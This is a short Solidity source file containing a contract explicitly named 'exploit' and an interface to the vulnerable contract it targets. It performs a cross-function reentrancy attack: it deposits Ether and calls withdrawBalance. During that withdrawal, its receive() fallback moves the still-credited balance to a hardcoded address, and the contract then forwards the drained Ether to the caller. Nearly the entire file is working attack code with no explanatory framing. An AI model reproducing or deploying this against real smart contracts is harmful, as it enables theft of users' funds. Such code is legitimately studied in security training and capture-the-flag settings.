// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

abstract contract vuln {
    mapping (address => uint) public userBalances;

function withdrawBalance() public virtual;
function transfer(address, uint) public virtual;
function deposit() public virtual payable;

}
contract exploit{

    vuln v;
    uint balanceAmount;
    address addressExp;
    function getMoney(address payable _contractVuln) public payable {
        v = vuln(_contractVuln);
        balanceAmount = msg.value;
        addressExp = _contractVuln;
        v.deposit{value:balanceAmount}();
        require(v.userBalances(address(this)) == msg.value, "f" );
        v.withdrawBalance();
        payable(msg.sender).transfer(address(this).balance);
    }


    receive() external payable {
        v.transfer(0x1125143Dd994cebcB03C77685C2b2F95098bF811, balanceAmount);
    }

}